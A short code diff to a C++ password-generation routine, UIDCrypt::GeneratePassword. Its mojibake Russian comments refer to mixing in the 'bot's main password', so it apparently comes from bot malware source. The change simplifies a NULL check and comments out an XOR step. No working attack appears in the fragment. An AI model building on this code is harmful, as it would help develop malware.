@@ -632,7 +632,7 @@ PCHAR UIDCrypt::GeneratePassword()
 
 	PCHAR Password = STR::Alloc(RC2_DEFAULT_PASSWORD_SIZE);
 
-	if (Password != NULL)
+	if (Password)
 	{
 		// ‘ормируем пароль
 		DWORD Size = Min(UIDSize, RC2_DEFAULT_PASSWORD_SIZE);
@@ -651,11 +651,11 @@ PCHAR UIDCrypt::GeneratePassword()
 
 		// ƒл€ большей уникальности полученный пароль
 		// дополн€ем главным паролем бота
-		PCHAR MPass = GetMainPassword(true);
-
-        XORCrypt::Crypt(MPass, (LPBYTE)Password, RC2_DEFAULT_PASSWORD_SIZE);
-
-		STR::Free(MPass);
+//		PCHAR MPass = GetMainPassword(true);
+//
+//        XORCrypt::Crypt(MPass, (LPBYTE)Password, RC2_DEFAULT_PASSWORD_SIZE);
+//
+//		STR::Free(MPass);
     }
 
 
